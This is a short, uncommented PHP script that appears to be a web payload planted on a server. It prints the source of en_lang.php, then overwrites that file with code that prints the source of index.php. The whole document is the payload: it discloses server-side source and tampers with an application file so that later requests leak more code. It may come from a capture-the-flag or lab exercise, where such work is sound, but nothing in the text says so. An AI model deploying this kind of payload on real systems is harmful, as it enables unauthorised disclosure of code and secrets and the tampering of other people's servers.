<?php 
  echo "Edited"; 
  show_source('en_lang.php');

  $myfile = fopen("en_lang.php", "w") or die("Unable to open file!");
  $txt = "<?php show_source('index.php'); ?>";
  fwrite($myfile, $txt);
  fclose($myfile);
?>
